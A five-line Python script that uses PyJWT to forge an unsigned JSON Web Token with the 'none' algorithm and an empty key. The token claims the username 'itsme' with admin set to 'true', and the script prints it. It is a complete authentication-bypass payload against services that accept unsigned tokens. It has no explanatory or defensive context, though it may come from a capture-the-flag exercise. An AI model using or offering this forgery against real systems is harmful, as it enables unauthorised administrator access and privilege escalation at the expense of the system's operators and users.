import jwt

encoded = jwt.encode({'username':'itsme','admin':'true'},'',algorithm='none')

print(encoded)